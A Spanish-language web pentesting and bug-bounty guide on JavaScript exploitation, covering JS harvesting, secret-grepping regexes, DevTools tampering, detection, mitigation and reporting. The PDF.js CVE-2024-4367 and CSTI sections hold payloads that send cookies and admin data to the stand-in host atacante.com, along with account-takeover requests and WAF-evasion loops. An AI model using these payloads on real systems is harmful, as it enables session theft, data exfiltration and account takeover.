# Explotación de JavaScript 

Los archivos JavaScript son la superficie de ataque más subestimada y crítica en aplicaciones web modernas. Todo lo que ve el navegador, lo ve también el atacante, convirtiendo el código del cliente en un tesoro de información para la explotación.[^2]

## Por qué los archivos JavaScript son críticos

JavaScript representa el 94.5% de todos los sitios web y contiene información que los desarrolladores frecuentemente exponen sin darse cuenta de las implicaciones de seguridad. Los archivos JavaScript pueden revelar:[^1]
**Endpoints ocultos** que nunca aparecen en el frontend visible (`/api/v1/admin`, `/internal/debug`, `/secret/backup`)
**Claves API y tokens expuestos** directamente en el código (AWS keys, Stripe tokens, JWT secrets)
**Lógica de negocio sensible** como validaciones de precios, reglas de acceso y roles de usuario
**Vulnerabilidades directas** como XSS via `innerHTML`, `eval()`, CSRF tokens predecibles[^5]

> **Regla de oro:** Si está en el frontend, está disponible para el atacante. Si está en JavaScript, es vulnerable hasta demostrar lo contrario.

## Metodología Completa de Recolección

### Tráfico Activo con Burp Suite

El primer paso es capturar todo el JavaScript que se carga durante la navegación activa:

1. Configura proxy en Burp Suite con certificado SSL instalado
2. Navega **victima.com** de forma exhaustiva - cada sección, funcionalidad y flujo de usuario
3. En **Target → Site map**, filtra por MIME type `script/javascript` y `application/javascript`
4. Exporta URLs a `burp_js.txt` para análisis posterior
   **Limitación:** Solo captura JS que se ejecutan durante esa sesión específica.[^6]

### Recolección Histórica con Archive.org

```bash
# Dominio específico con waybackurls
echo victima.com | waybackurls | grep '\.js$' | sort -u > wayback_js.txt
# Con subdominios para cobertura completa
subfinder -d victima.com -silent > subs.txt
cat subs.txt | waybackurls | grep '\.js$' | sort -u > allsubs_js.txt
```

### Extracción Profunda con CDX API

```bash
# Búsqueda específica por MIME type en Archive.org
curl -s "http://web.archive.org/cdx/search/cdx?url=victima.com/*&output=txt&fl=original&filter=mime:application/javascript" > cdx_js.txt
# Filtrar solo archivos activos
cat cdx_js.txt | httpx -mc 200 -silent > js_vivos.txt
```

### Crawlers Especializados

**Katana (recomendado para cobertura moderna):**

```bash
katana -u [https://victima.com](https://victima.com) -d 5 -silent -jc -kf robotstxt,sitemapxml | grep '\.js$' | sort -u > katana_js.txt
```

**GAU para archivos históricos:**

```bash
gau victima.com | grep '\.js$' | sort -u > gau_js.txt
```

## Análisis Estático Avanzado

### Grep Manual Quirúrgico

```bash
# Búsqueda básica de secretos - siempre primer paso
while read url; do
  echo "[*] Escaneando: $url"
  curl -s "$url" | grep -iE 'key|token|secret|api|aws|password|bearer|jwt' && echo "=== ENCONTRADO EN: $url ==="
done < js_vivos.txt
# Patrones específicos de alto valor
while read url; do
  content=$(curl -s "$url")
  echo "$content" | grep -iE 'aws_access_key|aws_secret_key|stripe_|sk_live|sk_test|AKIA[0-9A-Z]{16}' && echo "AWS/STRIPE: $url"
done < js_vivos.txt
```

### LinkFinder - Descubrimiento de Endpoints

LinkFinder es la herramienta estándar para extraer endpoints de archivos JavaScript:[^6]

```bash
# Instalación
git clone [https://github.com/GerbenJavado/LinkFinder.git](https://github.com/GerbenJavado/LinkFinder.git)
cd LinkFinder
pip3 install -r requirements.txt
python3 setup.py install
# Análisis de archivo específico
python3 linkfinder.py -i [https://victima.com/app.js](https://victima.com/app.js) -o cli
# Análisis completo de dominio
python3 linkfinder.py -i [https://victima.com](https://victima.com) -d -o results.html
# Análisis masivo de múltiples archivos
while read js_url; do
  python3 linkfinder.py -i "$js_url" -o cli
done < js_vivos.txt
```

### JSLeak - Detección de Credenciales

JSLeak ha evolucionado para incluir patrones de secrets-patterns-db:[^9]

```bash
# Instalación
go install github.com/channyein1337/jsleak@latest
# Análisis con verificación de estado
jsleak -l js_vivos.txt -k -s
# Con patrones personalizados
jsleak -l js_vivos.txt -c custom_patterns.yaml
```

### JSLeakRecon - Análisis Avanzado

Para análisis más sofisticado con stealth capabilities:[^10]

```bash
git clone [https://github.com/0xAb1d/JSLeakRecon.git](https://github.com/0xAb1d/JSLeakRecon.git)
cd JSLeakRecon
pip install -r requirements.txt
# Análisis con rotación de User-Agent
python3 jsleakrecon.py -u js_vivos.txt -t 10 -o html
```

### Nuclei - Detección Automatizada

Nuclei 3.3.2+ incluye templates específicos para JavaScript:[^12]

```bash
# Templates de exposición de secretos
nuclei -l js_vivos.txt -t exposures/configs/ -t exposures/tokens/ -o js_exposures.txt
# Templates personalizados para JavaScript
nuclei -l js_vivos.txt -t javascript/ -severity high,critical
```

## Análisis Dinámico Avanzado

### DevTools - Herramientas de Explotación

**Configuración inicial para máxima efectividad:**

1. **F12 → Sources** para debugging y breakpoints
2. **Application** para inspeccionar localStorage/sessionStorage
3. **Console** para manipulación en tiempo real
4. **Network** para interceptar requests/responses

### Técnicas de Breakpoint y Manipulación

#### Bypass de Autenticación Client-Side

```javascript
// 1. Buscar funciones de validación (ej: validateAdminPassword)
// 2. Agregar breakpoint en la línea de retorno
// 3. En consola cuando pause:
password = "admin123"; // Modificar variable esperada
isValid = true;       // Forzar validación exitosa
userRole = "administrator";
```

#### Manipulación de Estados de Usuario

```javascript
// Buscar e interceptar variables de estado
isPremium = true;
isAdmin = true;
userTier = "platinum";
hasFullAccess = true;
subscriptionActive = true;
// Para aplicaciones React/Vue
this.state.user.role = "admin";
this.$store.state.user.permissions = ["*"];
```

#### Bypass de Validaciones Client-side

```javascript
// Deshabilitar restricciones de formularios
document.querySelectorAll("input[readonly]").forEach(el => el.readOnly = false);
document.querySelectorAll("button:disabled").forEach(b => b.disabled = false);
document.querySelectorAll("input[max]").forEach(el => el.removeAttribute("max"));
// Modificar valores críticos antes de envío
document.querySelector("input[name='amount']").value = "0.01";
document.querySelector("input[name='discount']").value = "99";
```

### Local Overrides - Modificaciones Persistentes

Local Overrides en Chrome DevTools permite modificaciones permanentes durante la sesión:[^15]
**Configuración:**

1. **DevTools → Sources → Overrides**
2. **Enable Local Overrides** y seleccionar carpeta local
3. Click derecho en archivo JS → **Save for overrides**
4. Modificar código directamente:

```javascript
// Original: Validación de precio
if (user.balance < item.price) {
  throw new Error("Insufficient funds");
}
// Modificado con Override
if (false) { // Siempre permite compra
  throw new Error("Sufficient funds");
}
```

5. **Ctrl+S** para guardar cambios persistentes

### Técnicas de Debugging Avanzado

#### Conditional Breakpoints

```javascript
// En DevTools → Sources, click derecho en línea
// Agregar condición: user.role === "admin"
// Solo pausará cuando se cumpla la condición
```

#### Live Expressions para Monitoreo

```javascript
// En Console, click en ojo para crear Live Expression
document.cookie           // Monitorear cookies en tiempo real
localStorage.auth_token   // Observar cambios de tokens
window.currentUser        // Seguir estado de usuario
```

## Explotación de Vulnerabilidades Modernas

### PDF.js Arbitrary Code Execution (CVE-2024-4367)

Esta vulnerabilidad crítica permite ejecución arbitraria de JavaScript en contexto PDF.js:[^17]

```javascript
// Payload de explotación en PDF malicioso
<< 
/OpenAction << 
  /Type /Action 
  /S /JavaScript 
  /JS (
    var img = new Image();
    img.src = "https://atacante.com/steal?cookie=" + document.cookie;
    fetch('/api/admin/users').then(r => r.json()).then(data => {
      fetch('https://atacante.com/exfil', {
        method: 'POST', 
        body: JSON.stringify(data)
      });
    });
  )
>>
>>
```

### Client-Side Template Injection (CSTI)

Frameworks como Angular, Vue.js son vulnerables a inyección de templates:[^2]

```javascript
// AngularJS payload
{{constructor.constructor('fetch("/api/admin").then(r=>r.json()).then(d=>fetch("https://atacante.com",{method:"POST",body:JSON.stringify(d)}))')()}}
// Vue.js payload  
{{_createElementBlock.constructor("location.href='https://atacante.com?cookie='+document.cookie")()}}
```

### Supply Chain Attacks en JavaScript

Los ataques de cadena de suministro son cada vez más sofisticados:[^3]

```javascript
// Detección de librerías comprometidas
// Buscar en archivos JS descargados:
grep -r "data:text/html" *.js  // Payloads en data URIs
grep -r "eval\|Function\|setTimeout.*string" *.js  // Ejecución dinámica
grep -r "//.*cdn\..*\.tk\|//.*\.tk/" *.js  // CDNs sospechosos
```

## Técnicas de Ofuscación y Deofuscación

### Identificación de Código Ofuscado

- Variables con nombres como `_0x1234`, `a`, `b`, `c`
- Strings hexadecimales o base64 extensivos
- Uso de `eval()`, `Function()` constructor
- Cadenas de caracteres Unicode escapadas

### Deofuscación Avanzada

```javascript
// En DevTools Console para deofuscación dinámica
// 1. Interceptar eval() calls
const originalEval = window.eval;
window.eval = function(code) {
  console.log("EVAL INTERCEPTED:", code);
  return originalEval.call(this, code);
};
// 2. Beautify automático en Sources panel
// Click en {} (Pretty print) para formatear código minificado
// 3. Para ofuscación compleja, usar herramientas especializadas:
// - de4js.xyz para deofuscación automática
// - jsnice.org para renombrado inteligente de variables
```

## Automatización Avanzada

### Script de Recolección Completa

```bash
#!/bin/bash
TARGET=$1
WORDLIST="js_endpoints.txt"
echo "[+] Iniciando recolección masiva para $TARGET"
# Subdominios con múltiples herramientas
subfinder -d $TARGET -silent > subs.txt
assetfinder --subs-only $TARGET >> subs.txt
amass enum -passive -d $TARGET >> subs.txt
sort -u subs.txt > subs_final.txt
# Recolección histórica masiva  
cat subs_final.txt | waybackurls | grep '\.js$' | sort -u > wayback_js.txt
cat subs_final.txt | gau | grep '\.js$' | sort -u > gau_js.txt
# Crawling moderno
katana -l subs_final.txt -d 5 -jc -kf all -silent | grep '\.js$' | sort -u > katana_js.txt
# Archive.org CDX
while read domain; do
  curl -s "http://web.archive.org/cdx/search/cdx?url=$domain/*&output=txt&fl=original&filter=mime:application/javascript" >> cdx_js.txt
done < subs_final.txt
# Consolidar y filtrar vivos
cat wayback_js.txt gau_js.txt katana_js.txt cdx_js.txt | sort -u | httpx -mc 200 -silent > js_final.txt
echo "[+] $(wc -l < js_final.txt) archivos JavaScript encontrados y validados"
```

### Script de Análisis Automatizado

```bash
#!/bin/bash
JS_LIST=$1
OUTPUT_DIR="js_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR
echo "[+] Iniciando análisis masivo de JavaScript"
# Descarga local para análisis offline
while read url; do 
  filename=$(basename "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
  wget -q -T 10 "$url" -O "$OUTPUT_DIR/$filename.js" 2>/dev/null
done < $JS_LIST
# Análisis estático
echo "[*] Buscando secretos y credenciales..."
find $OUTPUT_DIR -name "*.js" -exec grep -l -i "api.*key\|secret\|token\|aws.*key\|stripe" {} \; > $OUTPUT_DIR/secrets_found.txt
# LinkFinder en todos los archivos
echo "[*] Extrayendo endpoints..."
find $OUTPUT_DIR -name "*.js" -exec python3 /path/to/linkfinder.py -i {} -o cli \; > $OUTPUT_DIR/all_endpoints.txt
# JSLeak para análisis profundo
echo "[*] Análisis con JSLeak..."
find $OUTPUT_DIR -name "*.js" > temp_js_list.txt
jsleak -l temp_js_list.txt -s > $OUTPUT_DIR/jsleak_results.txt
# Nuclei templates
echo "[*] Ejecutando templates Nuclei..."
nuclei -l $JS_LIST -t exposures/ -o $OUTPUT_DIR/nuclei_results.txt
echo "[+] Análisis completado en: $OUTPUT_DIR"
```

## Casos de Explotación de Alto Impacto

### Account Takeover via Endpoint Oculto

**Escenario real:**

1. **Descubrimiento:** LinkFinder encuentra `/api/v2/users/update-email` en `dashboard.js`
2. **Análisis:** Endpoint no requiere verificación de email actual
3. **Explotación:**

```javascript
fetch('/api/v2/users/update-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    userId: 'victim_id',
    newEmail: 'atacante@atacante.com'
  })
});
```

4. **Impacto:** Complete account takeover de cualquier usuario

### AWS Keys Expuestas en Production

**Proceso:**

1. **Descubrimiento:** `config.js` contiene:

```javascript
const AWS_CONFIG = {
  accessKeyId: 'AKIA...',
  secretAccessKey: 'wJalrXUtn...',
  region: 'us-east-1'
};
```

2. **Validación:** Keys activas con permisos S3
3. **Explotación:** Acceso completo a buckets de producción
4. **Impacto:** Data breach masivo con información de clientes

### Business Logic Bypass via Client-Side Validation

**Escenario:**

1. **Descubrimiento:** Función `calculateDiscount()` en `checkout.js`
2. **Análisis:** Validación solo client-side para cupones
3. **Explotación:** Local Override para siempre retornar 90% descuento
4. **Impacto:** Compras con descuentos no autorizados

## Técnicas Anti-Detección y Evasión

### Stealth Reconnaissance

```bash
# Rotación de User-Agents para evitar detección
USER_AGENTS=("Mozilla/5.0..." "Chrome/..." "Safari/...")
for ua in "${USER_AGENTS[@]}"; do
  curl -H "User-Agent: $ua" -s "$JS_URL" | grep -i "secret"
done
# Rate limiting para evitar WAF
while read url; do
  curl -s "$url" | grep -i "token" && sleep $(shuf -i 1-5 -n 1)
done < js_list.txt
```

### Análisis Diferencial

```bash
# Comparar versiones históricas para encontrar secretos removidos
curl -s "https://web.archive.org/web/20220101000000/https://victima.com/app.js" > old_version.js
curl -s "https://victima.com/app.js" > current_version.js
diff old_version.js current_version.js | grep -E "^<.*secret|^<.*key|^<.*token"
```

## Consideraciones para Bug Bounty y Pentesting

### Priorización de Objetivos

1. **Aplicaciones empresariales** con múltiples microservicios
2. **Dashboards administrativos** con funcionalidades privilegiadas
3. **APIs internas** expuestas en JavaScript de frontend
4. **Aplicaciones SaaS** con lógica de billing client-side
5. **Plataformas de e-commerce** con validaciones de precio

### Metodología de Reporting

```markdown
## JavaScript Exposure: Critical Secrets Leak
**Severity:** Critical
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
### Summary
AWS credentials hardcoded in production JavaScript file allow full access to company's S3 infrastructure.
### Proof of Concept
1. Navigate to [https://victima.com/dashboard](https://victima.com/dashboard)
2. View source and locate app.js
3. Search for "aws" reveals:
```

const config = {
AWS_ACCESS_KEY_ID: "AKIA...",
AWS_SECRET_ACCESS_KEY: "wJalrXUtn..."
};

```
4. Credentials verified active with S3 full access
### Impact
- Complete data breach of customer PII
- Ability to modify/delete production data  
- Potential for further infrastructure compromise
### Recommendation
- Remove all secrets from client-side code
- Implement proper secrets management
- Audit all JavaScript files for similar exposures
```

La explotación de JavaScript sigue siendo uno de los vectores de ataque más efectivos en 2024. La clave está en la combinación de recolección exhaustiva, análisis automatizado y manipulación manual experta. Los atacantes sofisticados utilizan estas técnicas para descubrir información que los desarrolladores nunca pretendieron exponer, desde credenciales hasta endpoints administrativos críticos.[^1]
Para los profesionales de seguridad, dominar estas técnicas es fundamental tanto para identificar vulnerabilidades como para comprender cómo los atacantes explotan aplicaciones modernas. La regla fundamental permanece: si está en JavaScript, está disponible para el atacante.
<span style="display:none">[^60]</span>

<div style="text-align: center">Explotación de JavaScript - Guía Completa</div>

Aquí tienes la nota corregida, ampliada y lista para GitBook, con metodología reproducible y PoC manual/automatizada usando atacante.com y victima.com.

# Explotación de JavaScript en Frontend

### Resumen

- Qué es: análisis y abuso del código JavaScript expuesto en el cliente para descubrir endpoints, secretos, lógica sensible y vulnerabilidades explotables.
- Por qué importa: todo lo que ve el navegador lo ve el atacante; JS suele filtrar rutas internas, tokens y validaciones débiles.
- Cuándo aplicarlo: en reconocimiento y explotación de aplicaciones web, especialmente SPA y frontends con APIs públicas/privadas.

### Contexto

- Supuestos:
  - Se cuenta con autorización formal (pentest/bug bounty) para probar victima.com y sus subdominios.
  - El alcance permite crawling, descarga y análisis de archivos JavaScript, tráfico pasivo mediante proxy y validación controlada en entornos no productivos cuando sea posible.
- Límites:
  - No realizar exploits destructivos, no modificar datos reales de usuarios, no ejecutar payloads que comprometan integridad/alta disponibilidad sin permiso explícito.
  - Técnicas client-side prueban hipótesis; la explotación real exige confirmación server-side.
- Entorno/herramientas y versiones probadas:
  - Burp Suite 2024.x (Community/Pro), Chrome/Edge DevTools estables.
  - Python 3.11+, Go 1.22+, Node 18+.
  - LinkFinder (última versión), JSLeak y JSLeakRecon, Katana v1.0.4+, waybackurls, gau, httpx, subfinder/assetfinder/amass, nuclei 3.3.2+ y templates exposures.
  - SO: Linux/macOS con bash y grep/rg/wget/curl.

### Metodología

1. Enumeración de JS
   - Crawling activo (Burp, Katana).
   - Recolección histórica (waybackurls, GAU, CDX).
   - Validación de disponibilidad (httpx).
2. Análisis estático
   - Búsqueda de secretos, endpoints y lógica crítica.
   - Extracción con LinkFinder.
   - Detección con JSLeak y templates de Nuclei.
3. Análisis dinámico
   - DevTools: breakpoints, localStorage/sessionStorage, Network, Overrides.
   - Tampering de estados/validaciones para confirmar impacto.
4. Priorización y explotación
   - Endpoints sensibles, credenciales activas, bypasses de lógica de negocio.
5. Evidencias
   - Capturas de requests/responses, IDs, timestamps, diffs de versiones, logs correlacionados.
6. Reporte
   - Título, impacto, pasos reproducibles, evidencias, mitigación y fuentes.

Checklist de verificación:

- ¿Se cubrieron subdominios y rutas históricas?
- ¿Se normalizaron y validaron URLs JS (200 OK)?
- ¿Se extrajeron endpoints y se agruparon por host y método?
- ¿Se validó la vigencia de credenciales encontradas de forma segura?
- ¿Se probó impacto server-side sin depender de controles client-side?
- ¿Se recopilaron evidencias mínimas y reproducibles?

### Pruebas manuales

- Burp/Proxy
  - Configura el navegador con el proxy de Burp y el certificado SSL instalado.
  - Navega exhaustivamente victima.com (alta cobertura funcional).
  - En Target → Site map filtra MIME “script/javascript”, “application/javascript”, “text/javascript”.
  - Exporta todas las URLs JS a burp_js.txt.
- DevTools (Chrome/Edge)
  - Sources: breakpoints en funciones críticas (login, checkout, roles, feature flags).
  - Application: inspección de localStorage/sessionStorage/indexedDB para tokens no expirados o configuración sensible.
  - Network: identifica endpoints ocultos, verbos y parámetros; duplica requests con “Copy as cURL”.
  - Console: evalúa estados y su efecto, sin asumir que un bypass client-side impacta el servidor.
- Tampering y reintentos
  - Ejecuta cambios con Local Overrides solo para validar hipótesis (ej. quitar una validación y observar respuesta del servidor).
  - Repite la acción capturando request-id, correlacionando con logs si es posible.
- Evidencias mínimas
  - Request completo (método, URL, headers, body) + Response (status, body relevante).
  - Timestamps y correlación con IDs (X-Request-ID, traceparent).
  - Diffs entre versiones históricas y actual de JS mostrando inserciones/borrados de secretos o endpoints.
  - Capturas de pantalla del panel Network con resalte del endpoint/parametro sensible.

### PoC

- PoC manual (descubrimiento y uso de endpoint oculto)

1. LinkFinder revela “/api/v1/admin/users/export” en https://victima.com/assets/app.min.js.
2. En DevTools → Network observa si el frontend nunca llama ese endpoint en UI.
3. Ejecuta manualmente:

```bash
curl -i -s -X GET 'https://victima.com/api/v1/admin/users/export' \
  -H 'Accept: application/json' \
  -H 'Authorization: Bearer <token_usuario_estándar>'
```

4. Resultado esperado para vulnerabilidad: 200 con datos sensibles pese a rol insuficiente.

- PoC automatizada (recolección y extracción de endpoints)

```bash
#!/bin/bash
set -euo pipefail
TARGET="victima.com"
echo "[+] Recolección"
subfinder -d "$TARGET" -silent > subs.txt
(echo "$TARGET"; cat subs.txt) | sort -u | tee scopes.txt >/dev/null
cat scopes.txt | waybackurls | grep -Ei '\.js(\?|$)' | sort -u > wayback_js.txt
gau -subs "$TARGET" | grep -Ei '\.js(\?|$)' | sort -u > gau_js.txt
katana -u "https://$TARGET" -d 5 -silent -jc -kf robotstxt,sitemapxml | \
  grep -Ei '\.js(\?|$)' | sort -u > katana_js.txt
cat wayback_js.txt gau_js.txt katana_js.txt | sort -u | \
  httpx -silent -mc 200 > js_vivos.txt

echo "[+] Extracción de endpoints con LinkFinder"
while read -r u; do
  python3 linkfinder.py -i "$u" -o cli
done < js_vivos.txt | sort -u > endpoints.txt

echo "[+] $(wc -l < js_vivos.txt) JS vivos | $(wc -l < endpoints.txt) endpoints"
```

Validación posterior: consume endpoints.txt con curl/httpie y verifica respuestas y controles de acceso.

### Explotación/automatización

- Variantes comunes
  - Endpoints “/internal”, “/debug”, “/admin”, “/export”, “/backup”, “/v2/private”.
  - Parámetros ocultos: “isAdmin”, “role”, “discount”, “priceId”, “impersonateUserId”.
  - Firmas de secretos: AKIA[0-9A-Z]{16}, “sk_live”, “xoxb-”, “AIzaSy”, “ghp_”.
- Bypass de validaciones client-side
  - Solo evidencian debilidad en el cliente; el impacto requiere que el servidor no revalide.
  - Usa Local Overrides para alterar lógica y confirma en Network si el servidor acepta la operación.
- Race conditions
  - Automatiza múltiples requests concurrentes para detectar incoherencias de control de acceso:

```bash
seq 1 20 | xargs -I{} -P10 curl -sS 'https://victima.com/api/v1/admin/users/export' \
  -H 'Authorization: Bearer <token>' -o /dev/null -w "%{http_code}\n"
```

- Señales: códigos 200 intermitentes sin autorización, respuestas duplicadas o inconsistentes.
- Snippet útil (detección de secretos en JS locales)

```bash
# Descarga + patrones de alto valor
mkdir -p js_dl
while read -r url; do
  fn="js_dl/$(echo "$url" | sed 's#[^a-zA-Z0-9._-]#_#g')"
  curl -sS --max-time 10 "$url" -o "$fn"
done < js_vivos.txt

rg -n --ignore-case -e 'AKIA[0-9A-Z]{16}' -e 'sk_(live|test)_[0-9a-zA-Z]+' \
   -e 'xox[baprs]-[0-9A-Za-z-]+' -e 'AIzaSy[0-9A-Za-z-_]+' \
   -e 'ghp_[0-9A-Za-z]+' js_dl > secretos_encontrados.txt
```

### Impacto

- Escenarios
  - Toma de cuenta: endpoint oculto que permite cambiar email sin verificación.
  - Filtración de datos: exportaciones administrativas accesibles con rol básico.
  - Compromiso de infraestructura: claves cloud/API activas en el frontend.
  - Fraude de negocio: descuentos/precios manipulables por ausencia de revalidación server-side.
- Mapeo OWASP/CWE
  - OWASP Top 10: A01-Broken Access Control, A02-Cryptographic Failures, A05-Security Misconfiguration.
  - OWASP Top 10 Client-Side: exposición de secretos, CSTI, fallas de integridad de recursos.
  - CWE-200 (Information Exposure), CWE-522 (Insufficiently Protected Credentials), CWE-639 (Insecure Direct Object Reference).
- Severidad (ejemplo)
  - Exposición de credenciales cloud con privilegios de lectura/escritura en buckets de producción.
  - CVSS 3.1 ejemplo: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N), ajustar según permisos reales.

### Detección

- Qué loguear
  - Aplicación/API: method, path, status, subject (userId/tenantId), scopes/roles evaluados, decision y policy aplicada, request-id y latencias.
  - WAF/CDN: firmas de scraping (alto ratio .js), user-agents rotatorios, anomalías de origen, picos de 404/403 en rutas /admin, /internal.
  - CSP Report-Only: violaciones de script-src, connect-src y exfiltración a dominios externos (ej. atacante.com).
  - Infra cloud: CloudTrail/Audit Logs para uso de credenciales; detección de accessKey fuera de rangos de IP esperados.
- Dónde
  - App logs centralizados (ELK/Cloud Logging), WAF/CDN dashboards, SIEM para correlación multi-capa, almacenamiento de reportes CSP.
- Señales útiles
  - descargas masivas de JS, enumeración histórica inusual (user-agents cli), requests a endpoints huérfanos no referenciados en UI, CORS preflights desde orígenes anómalos.

### Mitigación

- Correcciones
  - Elimina secretos del frontend; usa vault/secret manager y firma de peticiones desde el backend.
  - Válida todo en el servidor: roles, reglas de negocio, precios, descuentos, ownership.
  - Segmenta endpoints: separa admin/internal, aplica autenticación fuerte y autorización contextual.
  - Minimiza superficies: build que excluya rutas de debug y flags no usados.
- Controles preventivos
  - CSP estricta, SRI en recursos externos, Integrity Enforcement en supply chain.
  - Escaneo de secretos en CI (gitleaks, trufflehog) y revisión en PR.
  - Revisión periódica de bundles con detección de endpoints y patrones de secretos.
- Pruebas post-fix
  - Regression: repetir PoC con las mismas entradas, esperar 401/403 o sanitización.
  - Verificar que no queden endpoints accesibles por caminos alternativos o versiones cacheadas/CDN.
  - Confirmar rotación y revocación de credenciales expuestas, con evidencia en logs.

### Errores comunes

- Falsos positivos
  - Claves demo/test sin alcance en producción, tokens caducados o “client IDs” públicos.
  - Endpoints legacy ya deshabilitados o detrás de feature flags server-side.
- Límites
  - Bypass solo client-side sin efecto real por controles server-side robustos.
  - Resultados de LinkFinder con rutas relativas que no existen o que requieren contextos específicos.
  - Deobfuscación incompleta que conduce a interpretaciones erróneas.
- Buenas prácticas
  - Confirmar siempre el lado servidor, aportar evidencias de impacto, no inferir severidad sin permisos reales.

### Reporte

- Título
  - “Exposición crítica de endpoints y secretos en archivos JavaScript de victima.com”
- Impacto
  - Acceso no autorizado a datos administrativos y riesgo de compromiso de infraestructura por claves expuestas.
- Alcance afectado
  - Dominio/s, rutas/JS específicos, versiones/fechas observadas.
- Pasos reproducibles

1. Recolectar JS vivos desde victima.com (katana/waybackurls/gau + httpx).
2. Extraer endpoints con LinkFinder y validar manualmente.
3. Enviar petición a “/api/v1/admin/users/export” con token de usuario estándar.
4. Observar 200 y cuerpo con datos sensibles.

- Evidencias
  - Requests/responses completos, timestamps, request-id, capturas de Network, diffs de JS que introducen/retiran secretos, logs correlacionados del backend.
- Mitigación propuesta
  - Mover secretos al backend, aplicar autorización robusta en endpoints afectados, rotar/revocar credenciales, añadir tests de regresión y escaneo de secretos en CI.
- Referencias
  - Documentación y herramientas usadas, artículos técnicos, CVE aplicables si corresponde.

### Fuentes

- Developer Chrome DevTools: https://developer.chrome.com/docs/devtools
- OWASP Top 10 Client-Side Security Risks: https://owasp.org/www-project-top-10-client-side-security-risks
- LinkFinder (repo): https://github.com/GerbenJavado/LinkFinder
- ProjectDiscovery Katana: https://github.com/projectdiscovery/katana
- ProjectDiscovery Nuclei: https://github.com/projectdiscovery/nuclei
- Nuclei templates (exposures): https://github.com/projectdiscovery/nuclei-templates
- waybackurls: https://github.com/tomnomnom/waybackurls
- gau (GetAllURLs): https://github.com/lc/gau
- httpx: https://github.com/projectdiscovery/httpx
- JSLeak: https://github.com/channyein1337/jsleak
- JSLeakRecon: https://github.com/0xAb1d/JSLeakRecon
- CSP reporting: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
- PDF.js CVE-2024-4367 análisis técnico: https://www.wiz.io/vulnerability-database/cve/cve-2024-4367
- YesWeHack: discovery de endpoints ocultos: https://www.yeswehack.com/learn-bug-bounty/discover-map-hidden-endpoints-parameters

### Anexos prácticos

#### Recolección histórica con CDX API (filtrado y validación)

```bash
curl -s 'https://web.archive.org/cdx/search/cdx?url=victima.com/*&output=txt&fl=original&filter=mime:application/javascript' \
  | sort -u | httpx -silent -mc 200 > cdx_js.txt
```

#### Grep quirúrgico de secretos

```bash
while read -r url; do
  body=$(curl -sS --max-time 10 "$url")
  if echo "$body" | grep -Ei 'AKIA[0-9A-Z]{16}|sk_(live|test)_[0-9a-zA-Z]+' >/dev/null; then
    echo "[+] Posible secreto en: $url"
  fi
done < js_vivos.txt
```

#### LinkFinder por dominio/archivo

```bash
python3 linkfinder.py -i https://victima.com -d -o results.html
python3 linkfinder.py -i https://victima.com/app.js -o cli
```

#### Nuclei para exposiciones en JS

```bash
nuclei -l js_vivos.txt -t exposures/configs/ -t exposures/tokens/ -severity medium,high,critical -o js_exposures.txt
```

#### DevTools: Overrides controlados

- Sources → Overrides → Enable, guarda app.js y modifica temporalmente validaciones para observar respuesta real del servidor. Si el servidor responde con éxito a una acción inválida, hay vulnerabilidad server-side.

#### Ejemplo: ATO por endpoint oculto (fetch en navegador)

```javascript
fetch("https://victima.com/api/v2/users/update-email", {
  method: "POST",
  headers: {"Content-Type": "application/json", "Authorization": "Bearer <token_estandar>"},
  body: JSON.stringify({ userId: "12345", newEmail: "pwn@atacante.com" })
}).then(r => r.status).then(console.log);
```

#### Nota sobre CSTI y PDF.js

- CSTI en frameworks (Angular/Vue) requiere confirmar vector reflectivo/almacenado y ejecución real.
- PDF.js CVE-2024-4367: prueba solo en entorno controlado; validar versiones vulnerables y que la carga maliciosa alcance el intérprete. No ejecutar contra producción sin permiso.

Con esta guía, puedes pasar de la recolección exhaustiva a la explotación validada con evidencias sólidas y un flujo de reporte profesional, maximizando hallazgos reales y minimizando falsos positivos en victima.com, con PoC claras y automatización eficiente para escalar la cobertura sin perder rigor.

[^1]: [https://gitnation.com/contents/the-state-of-javascript-security-in-2024](https://gitnation.com/contents/the-state-of-javascript-security-in-2024)
    
[^2]: [https://jscrambler.com/blog/the-most-effective-way-to-protect-client-side-javascript-applications](https://jscrambler.com/blog/the-most-effective-way-to-protect-client-side-javascript-applications)
    
[^3]: [https://www.humansecurity.com/learn/blog/client-side-battle-against-javascript-attacks/](https://www.humansecurity.com/learn/blog/client-side-battle-against-javascript-attacks/)
    
[^4]: [https://www.freecodecamp.org/news/how-to-secure-javascript-applications/](https://www.freecodecamp.org/news/how-to-secure-javascript-applications/)
    
[^5]: [https://www.contrastsecurity.com/developer/learn/client-side-injection](https://www.contrastsecurity.com/developer/learn/client-side-injection)
    
[^6]: [https://systemweakness.com/finding-endpoints-and-secrets-in-javascript-files-for-web-application-security-846462fd2a69](https://systemweakness.com/finding-endpoints-and-secrets-in-javascript-files-for-web-application-security-846462fd2a69)
    
[^7]: [https://www.geeksforgeeks.org/linux-unix/linkfinder-script-to-search-endpoints-in-javascript-files/](https://www.geeksforgeeks.org/linux-unix/linkfinder-script-to-search-endpoints-in-javascript-files/)
    
[^8]: [https://github.com/channyein1337/jsleak](https://github.com/channyein1337/jsleak)
    
[^9]: [https://offsec.tools/tool/jsleak](https://offsec.tools/tool/jsleak)
    
[^10]: [https://github.com/0xAb1d/JSLeakRecon](https://github.com/0xAb1d/JSLeakRecon)
    
[^11]: [https://www.wiz.io/blog/nuclei-signature-verification-bypass](https://www.wiz.io/blog/nuclei-signature-verification-bypass)
    
[^12]: https://orca.security/resources/blog/using-nuclei-templates-for-vulnerability-scanning/
    
[^13]: [https://www.pbrumby.com/2024/12/27/using-chrome-local-overrides-to-maintain-changes-after-refreshing-the-browser/](https://www.pbrumby.com/2024/12/27/using-chrome-local-overrides-to-maintain-changes-after-refreshing-the-browser/)
    
[^14]: [https://www.debugbear.com/blog/devtools-local-overrides](https://www.debugbear.com/blog/devtools-local-overrides)
    
[^15]: [https://www.trysmudford.com/blog/chrome-local-overrides/](https://www.trysmudford.com/blog/chrome-local-overrides/)
    
[^16]: [https://www.wiz.io/vulnerability-database/cve/cve-2024-4367](https://www.wiz.io/vulnerability-database/cve/cve-2024-4367)
    
